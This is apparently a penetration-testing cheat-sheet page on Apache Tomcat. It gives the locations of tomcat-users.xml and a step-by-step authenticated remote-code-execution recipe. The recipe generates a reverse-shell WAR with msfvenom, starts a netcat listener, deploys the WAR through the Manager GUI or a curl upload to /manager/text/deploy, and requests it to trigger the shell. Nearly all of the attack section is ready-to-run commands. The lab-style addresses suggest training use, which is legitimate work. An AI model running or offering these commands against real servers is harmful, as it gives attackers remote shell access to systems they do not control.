---
title: "Apache Tomcat"
date: 2024-7-2
tags: ["tomcat", "apache", "web server", "war", "java"]
---

---
### Config Location

```bash
/usr/share/tomcat9/etc/tomcat-users.xml
```

```bash
/etc/tomcat9/tomcat-users.xml
```

### RCE (Authenicated)

```bash
# Create malicious WAR file
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war
```

```bash
# Open a nc listener
rlwrap nc -lvnp 1337
```

#### Manager GUI

```bash
+------------------------------------------+
|Exploit                                   |
+------------------------------------------+
|1. Login to Tomcat Web Application Manager|
|2. WAR file to deploy -> Deploy           |
|3. Click /revshell in Applications table  |
+------------------------------------------+
```

#### Manager Script

```bash
curl -u 'username:password' http://10.10.11.10:8080/manager/text/deploy?path=/revshell --upload-file revshell.war
```

```bash
curl -s http://10.10.11.10:8080/revshell
```

<br>
